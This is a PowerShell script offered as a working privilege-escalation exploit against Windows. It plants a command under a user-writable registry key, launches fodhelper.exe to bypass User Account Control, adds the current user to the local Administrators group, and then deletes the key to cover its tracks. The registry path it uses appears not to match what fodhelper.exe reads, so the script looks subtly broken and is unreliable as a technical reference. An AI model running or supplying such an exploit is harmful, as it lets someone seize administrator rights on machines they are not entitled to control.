$command = "cmd.exe /c net localgroup administrators $env:USERNAME /add"
$regPath = "HKCU:\Software\Classes\.pwn\Shell\Open\command"
try {
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $command
    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"
    Start-Sleep -Seconds 2
    Remove-Item -Path "HKCU:\Software\Classes\.pwn" -Recurse -Force
    Write-Output "Exploit executed. Check if you are now an Administrator."
}
catch {
    Write-Output "Error: $_"
}
